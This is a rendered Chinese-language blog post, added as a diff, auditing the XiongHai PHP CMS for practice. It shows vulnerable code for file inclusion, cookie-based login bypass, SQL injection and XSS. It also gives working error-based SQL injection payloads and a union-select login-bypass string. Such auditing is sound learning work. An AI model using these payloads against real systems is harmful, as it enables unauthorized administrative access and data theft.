@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <script type="application/ld+json">
+
+{  
+  "@context":"https://schema.org",
+  "@type":"Website",
+  "@id":"https:\/\/github.com\/yeahai\/yeahai.github.io.git",
+  "author": {
+    "@type": "Person",
+    "name": "Yeahii",
+    
+    "image": "https://cdn1.iconfinder.com/data/icons/ninja-things-1/1772/ninja-simple-512.png"
+    
+  },
+  "name":"Hugo tranquilpeak theme",
+  "description":"\u003ch1 id=\u0022熊海cms代码审计\u0022\u003e熊海CMS代码审计\u003c\/h1\u003e",
+  "url":"https:\/\/github.com\/yeahai\/yeahai.github.io.git\/post\/xhcms\/",
+  "keywords":"[php]"
+}
+
+</script>
+
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.96.0 with theme Tranquilpeak 0.5.3-BETA">
+<meta name="author" content="Yeahii">
+<meta name="keywords" content="php">
+<meta name="description" content="熊海CMS代码审计">
+
+
+<meta property="og:description" content="熊海CMS代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="熊海CMS">
+<meta name="twitter:title" content="熊海CMS">
+<meta property="og:url" content="https://github.com/yeahai/yeahai.github.io.git/post/xhcms/">
+<meta property="twitter:url" content="https://github.com/yeahai/yeahai.github.io.git/post/xhcms/">
+<meta property="og:site_name" content="Hugo tranquilpeak theme">
+<meta property="og:description" content="熊海CMS代码审计">
+<meta name="twitter:description" content="熊海CMS代码审计">
+<meta property="og:locale" content="en-us">
+
+  
+    <meta property="article:published_time" content="2022-06-10T12:14:12">
+  
+  
+    <meta property="article:modified_time" content="2022-06-10T12:14:12">
+  
+  
+  
+    
+      <meta property="article:section" content="category">
+    
+      <meta property="article:section" content="subcategory">
+    
+  
+  
+    
+      <meta property="article:tag" content="php">
+    
+      <meta property="article:tag" content="audit">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://cdn1.iconfinder.com/data/icons/ninja-things-1/1772/ninja-simple-512.png">
+  <meta property="twitter:image" content="https://cdn1.iconfinder.com/data/icons/ninja-things-1/1772/ninja-simple-512.png">
+
+
+
+
+
+
+    <title>熊海CMS</title>
+
+    <link rel="icon" href="https://github.com/yeahai/yeahai.github.io.git/favicon.png">
+    
+
+    
+
+    <link rel="canonical" href="https://github.com/yeahai/yeahai.github.io.git/post/xhcms/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    
+    <link rel="stylesheet" href="https://github.com/yeahai/yeahai.github.io.git/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://github.com/yeahai/yeahai.github.io.git/" aria-label="Go to homepage">Hugo tranquilpeak theme</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://github.com/yeahai/yeahai.github.io.git/#about" aria-label="Open the link: /#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://cdn1.iconfinder.com/data/icons/ninja-things-1/1772/ninja-simple-512.png" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://github.com/yeahai/yeahai.github.io.git/#about" aria-label="Read more about the author">
+          <img class="sidebar-profile-picture" src="https://cdn1.iconfinder.com/data/icons/ninja-things-1/1772/ninja-simple-512.png" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Yeahii</h4>
+        
+          <h5 class="sidebar-profile-bio">I want to learning everything.</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/yeahai/yeahai.github.io.git/" title="Home">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-home" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/yeahai/yeahai.github.io.git/categories" title="Categories">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Categories</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/yeahai/yeahai.github.io.git/tags" title="Tags">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-tags" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/yeahai/yeahai.github.io.git/archives" title="Archives">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-archive" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Archives</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/yeahai/yeahai.github.io.git/#about" title="About">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-question" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/yeahai" target="_blank" rel="noopener" title="GitHub">
+    
+      <i class="sidebar-button-icon fab fa-lg fa-github" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/yeahai/yeahai.github.io.git/www.google.com" title="Stack Overflow">
+    
+      <i class="sidebar-button-icon fab fa-lg fa-stack-overflow" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Stack Overflow</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/yeahai/yeahai.github.io.git/index.xml" title="RSS">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-rss" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="4"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" id="top">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title">
+      熊海CMS
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time datetime="2022-06-10T12:14:12&#43;08:00">
+        
+  June 10, 2022
+
+      </time>
+    
+    
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://github.com/yeahai/yeahai.github.io.git/categories/category">category</a>, 
+    
+      <a class="category-link" href="https://github.com/yeahai/yeahai.github.io.git/categories/subcategory">subcategory</a>
+    
+  
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown">
+            <div class="main-content-wrap">
+              <h1 id="熊海cms代码审计">熊海CMS代码审计</h1>
+<h2 id="前言">前言:</h2>
+<p>看到很多大佬都是熊海CMS入的门,为了更好的理解漏洞成因,所以准备入门代码审计</p>
+<h2 id="坑点">坑点:</h2>
+<ol>
+<li>我install填好信息后提交,结果页面一直是白的,翻了很多人的博客才发现是PHP的版本高了,建议使用7以下</li>
+<li>一开始没打算用root用户创建表,用的自己创建的低权限用户y,后面就是提示Connect Error denied 提示权限不够,建议使用root</li>
+</ol>
+<h2 id="代码审计">代码审计</h2>
+<ol>
+<li>文件包含漏洞</li>
+</ol>
+<p>首页(index.php|admin/index.php)代码:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//单一入口模式
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>); <span style="color:#75715e">//关闭错误显示
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$file<span style="color:#f92672">=</span><span style="color:#a6e22e">addslashes</span>($_GET[<span style="color:#e6db74">&#39;r&#39;</span>]); <span style="color:#75715e">//接收文件名
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$action<span style="color:#f92672">=</span>$file<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">?</span><span style="color:#e6db74">&#39;index&#39;</span><span style="color:#f92672">:</span>$file; <span style="color:#75715e">//判断为空或者等于index
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;files/&#39;</span><span style="color:#f92672">.</span>$action<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.php&#39;</span>); <span style="color:#75715e">//载入相应文件
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>从这里我们不难看出首页这里传进了一个参数,没有调用和匹配正则过滤用户传入的参数,所以我们可以尝试包含一下phpinfo试试看
+<img src="https://github.com/yeahai/yeahai.github.io.git/image/xhcms/phpinfo.png" alt="img"></p>
+<ol start="2">
+<li>越权(inc/checklogin.php) 代码</li>
+</ol>
+<p>下面这段代码对Cookie进行了简单的验证,判断Cookie中user是不是用户名(要求是存在的用户名)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$user<span style="color:#f92672">=</span>$_COOKIE[<span style="color:#e6db74">&#39;user&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($user<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;&#34;</span>){
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: ?r=login&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">exit</span>;	
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>这里我没有勾选上Cookie,它是会跳转到login
+<img src="https://github.com/yeahai/yeahai.github.io.git/image/xhcms/yuequan.png" alt="img">
+这里我勾选上Cookie,它会自动登录到admin账号的后台
+<img src="https://github.com/yeahai/yeahai.github.io.git/image/xhcms/yuequan2.png" alt="img"></p>
+<ol start="3">
+<li>SQL注入(admin/file/login.php)</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">ob_start</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">require</span> <span style="color:#e6db74">&#39;../inc/conn.php&#39;</span>;
+</span></span><span style="display:flex;"><span>$login<span style="color:#f92672">=</span>$_POST[<span style="color:#e6db74">&#39;login&#39;</span>];
+</span></span><span style="display:flex;"><span>$user<span style="color:#f92672">=</span>$_POST[<span style="color:#e6db74">&#39;user&#39;</span>];
+</span></span><span style="display:flex;"><span>$password<span style="color:#f92672">=</span>$_POST[<span style="color:#e6db74">&#39;password&#39;</span>];
+</span></span><span style="display:flex;"><span>$checkbox<span style="color:#f92672">=</span>$_POST[<span style="color:#e6db74">&#39;checkbox&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($login<span style="color:#f92672">&lt;&gt;</span><span style="color:#e6db74">&#34;&#34;</span>){
+</span></span><span style="display:flex;"><span>$query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT * FROM manage WHERE user=&#39;</span><span style="color:#e6db74">$user</span><span style="color:#e6db74">&#39;&#34;</span>; <span style="color:#75715e">// 这里传入了参数,直接进行了拼接,而没有过滤
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$result <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_query</span>($query) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;SQL语句有误：&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">mysql_error</span>()); <span style="color:#75715e">// 这里开启了报错
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$users <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_fetch_array</span>($result);
+</span></span></code></pre></div><p>直接通过POST方式接收user、password，并且没有做任何过滤。然后先查询用户名，如果用户名存在，就将将POST得到的密码进行md5，然后和数据库中对应的密码进行比较。这样的话，虽然我们可以通过万能密码admin&rsquo; or &lsquo;1&rsquo;=&lsquo;1对用户名绕过，但是密码没有方法绕过，万能密码的方法就不可行了。 不过由于没有做任何过滤，我们还是可以执行SQL语句的</p>
+<p>这里我们可以修改源代码中的提示错误来判断是不是万能密码生效了,但是密码验证没过!
+例如我们修改源码中的用户名与密码错误
+<img src="https://github.com/yeahai/yeahai.github.io.git/image/xhcms/user&amp;pass.png" alt="img"></p>
+<p>然后再次尝试万能密码:<code>admin' or '1' = '1</code>
+<img src="https://github.com/yeahai/yeahai.github.io.git/image/xhcms/tips.png" alt="img"></p>
+<p>payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ae81ff">123</span><span style="color:#e6db74">&#39; or updatexml(1,concat((select concat(0x7e,user) from manage)),0) #</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; or extractvalue(1,concat((select concat(0x7e,user) from manage)))#</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; or extractvalue(1,concat(0x7e,(select user from manage)))#</span>
+</span></span><span style="display:flex;"><span>admin<span style="color:#e6db74">&#39; or updatexml(1,concat(0x7e,(user()),0x7e),1); #</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">//</span> 下面这个万能密码可以登入后台
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; union select 1,2,&#39;</span>test<span style="color:#e6db74">&#39;,&#39;</span>c4ca4238a0b923820dcc509a6f75849b<span style="color:#e6db74">&#39;,5,6,7,8#&#39;</span>
+</span></span></code></pre></div><p><img src="https://github.com/yeahai/yeahai.github.io.git/image/xhcms/baocuoinjection.png" alt="img"></p>
+<p>万能密码登入后台:
+可以先试试这个 payload在mysql中查询的结果
+<img src="https://github.com/yeahai/yeahai.github.io.git/image/xhcms/mysqllogin.png" alt="img">
+代码讲解:
+<img src="https://github.com/yeahai/yeahai.github.io.git/image/xhcms/jiangjie.png" alt="img">
+这里最后一个框说的是判断最开始传入的密码和user中query取出的密码的md5值比较
+那么只要利用 <code>1' union select 1,2,'test','c4ca4238a0b923820dcc509a6f75849b',5,6,7,8#' </code> 加上密码为第四个字段的md5值就可以了
+<img src="https://github.com/yeahai/yeahai.github.io.git/image/xhcms/wannenglogin.png" alt="img">
+<img src="https://github.com/yeahai/yeahai.github.io.git/image/xhcms/wannenglogin2.png" alt="img"></p>
+<ol start="4">
+<li>xss(files/contact.php)</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$page<span style="color:#f92672">=</span><span style="color:#a6e22e">addslashes</span>($_GET[<span style="color:#e6db74">&#39;page&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addslashes</span> <span style="color:#75715e">//返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（&#39;）、双引号（&#34;）、反斜线（\）与 NUL（NULL 字符）。
+</span></span></span></code></pre></div><p><img src="https://github.com/yeahai/yeahai.github.io.git/image/xhcms/xss.png" alt="img"></p>
+              
+
+
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://github.com/yeahai/yeahai.github.io.git/tags/php/">php</a>
+
+  <a class="tag tag--primary tag--small" href="https://github.com/yeahai/yeahai.github.io.git/tags/audit/">audit</a>
+
+                  </div>
+                
+              
+            
+            
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://github.com/yeahai/yeahai.github.io.git/post/iic/" data-tooltip="IIC" aria-label="PREVIOUS: IIC">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Share this post">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://github.com/yeahai/yeahai.github.io.git/post/xhcms/" title="Share on Facebook" aria-label="Share on Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://github.com/yeahai/yeahai.github.io.git/post/xhcms/" title="Share on Twitter" aria-label="Share on Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://github.com/yeahai/yeahai.github.io.git/post/xhcms/" title="Share on Linkedin" aria-label="Share on Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="Leave a comment">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="Back to top">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+            
+  
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https:\/\/github.com\/yeahai\/yeahai.github.io.git\/post\/xhcms\/';
+        
+          this.page.identifier = '\/post\/xhcms\/'
+        
+      };
+      (function() {
+        
+        
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+          return;
+        }
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = 'hugo-tranquilpeak-theme';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+  
+
+
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2022 Yeahii. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://github.com/yeahai/yeahai.github.io.git/post/iic/" data-tooltip="IIC" aria-label="PREVIOUS: IIC">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Share this post">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://github.com/yeahai/yeahai.github.io.git/post/xhcms/" title="Share on Facebook" aria-label="Share on Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://github.com/yeahai/yeahai.github.io.git/post/xhcms/" title="Share on Twitter" aria-label="Share on Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://github.com/yeahai/yeahai.github.io.git/post/xhcms/" title="Share on Linkedin" aria-label="Share on Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="Leave a comment">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="Back to top">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+      </div>
+      
+<div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-times"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fgithub.com%2Fyeahai%2Fyeahai.github.io.git%2Fpost%2Fxhcms%2F" aria-label="Share on Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i><span>Share on Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fgithub.com%2Fyeahai%2Fyeahai.github.io.git%2Fpost%2Fxhcms%2F" aria-label="Share on Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fgithub.com%2Fyeahai%2Fyeahai.github.io.git%2Fpost%2Fxhcms%2F" aria-label="Share on Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i><span>Share on Linkedin</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+
+
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-times"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://cdn1.iconfinder.com/data/icons/ninja-things-1/1772/ninja-simple-512.png" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Yeahii</h4>
+    
+      <div id="about-card-bio">I want to learning everything.</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Null
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker-alt"></i>
+        <br/>
+        China
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://github.com/yeahai/yeahai.github.io.git/images/cover.jpg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/highlight.min.js" integrity="sha512-z+/WWfyD5tccCukM4VvONpEtLmbAm5LDu7eKiyMQJ9m7OfPEDL7gENyDRL3Yfe8XAuGsS2fS4xSMnl6d30kqGQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script src="https://github.com/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>
+
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-gE8KAQyFIzV1C9+GZ8TKJHZS2s+n7EjNtC+IMRn1l5+WYJTHOODUM6JSjZhFhqXmc7bG8Av6XXpckA4tYhflnw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/apache.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-EWROca+bote+7Oaaar1F6y74iZj1r1F9rm/ly7o+/FwJopbBaWtsFDmaKoZDd3QiGU2pGacBirHJNivmGLYrow==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/go.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-GDVzAn0wpx1yVtQsRWmFc6PhJiLBPdUic+h4GWgljBh904O3JU10fk9EKNpVyIoPqkFn54rgL2QBG4BmUTMpiQ==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/http.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-UgZlma8NzkrDb/NWgmLIcTrH7i/CSnLLDRFqCSNF5NGPpjKmzyM25qcoXGOup8+cDakKyaiTDd7N4dyH4YT+IA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/less.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-lot9koe73sfXIrUvIPM/UEhuMciN56RPyBdOyZgfO53P2lkWyyXN7J+njcxIIBRV+nVDQeiWtiXg+bLAJZDTfg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/nginx.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-Zd3e7XxHP00TD0Imr0PIfeM0fl0v95kMWuhyAS3Wn1UTSXTkz0OhtRgBAr4JlmADRgiXr4x7lpeUdqaGN8xIog==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/puppet.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-qtqDO052iXMSP+5d/aE/jMtL9vIIGvONgTJziC2K/ZIB1yEGa55WVxGE9/08rSQ62EoDifS9SWVGZ7ihSLhzMA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/scss.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-1NmkjnEDnwwwcu28KoQF8vs3oaPFokQHbmbtwGhFfeDsQZtVFI8zW2aE9O8yMYdpdyKV/5blE4pSWw4Z/Sv97w==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/stylus.min.js"></script>
+  
+
+  
